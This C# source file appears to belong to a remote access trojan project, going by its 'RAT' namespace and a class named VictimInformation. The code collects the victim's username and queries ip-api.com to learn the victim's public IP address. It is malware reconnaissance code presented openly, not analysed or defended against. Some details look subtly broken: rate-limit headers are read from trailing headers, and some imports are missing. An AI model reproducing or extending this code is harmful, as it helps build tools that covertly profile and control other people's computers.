using System;
using System.Net;
using System.Net.Http;
using RAT.APIs;

namespace RAT;

public class VictimInformation
{
    public volatile static VictimInformation Shared = new();
    public IPAddress? IP { get; private set; }
    public string UserName { get; } = Environment.UserName;
    public async Task<bool> RefreshIP()
    {
        try
        {
            HttpResponseMessage qJson = null;
            while (true)
            {
                qJson = await SingleInstance.HttpClient.GetAsync("http://ip-api.com/json/"); // Quick API.

                int remainingReq = int.Parse(qJson.TrailingHeaders.GetValues("X-Rl").First());
                if (!qJson.IsSuccessStatusCode && qJson.StatusCode is not HttpStatusCode.TooManyRequests && remainingReq > 1)
                {
                    return false;
                }
                else if (qJson.StatusCode is HttpStatusCode.TooManyRequests || remainingReq < 2)
                {
                    await Task.Delay(int.Parse(qJson.TrailingHeaders.GetValues("X-Ttl").First()));
                }
                else
                {
                    break;
                }
            }
            IpJson victimData = (await System.Text.Json.JsonSerializer.DeserializeAsync<IpJson>(qJson.Content.ReadAsStream()))!;
            IP = IPAddress.Parse(victimData.Query!);
            return true;
        }
        catch
        {
            return false;
        }
    }
}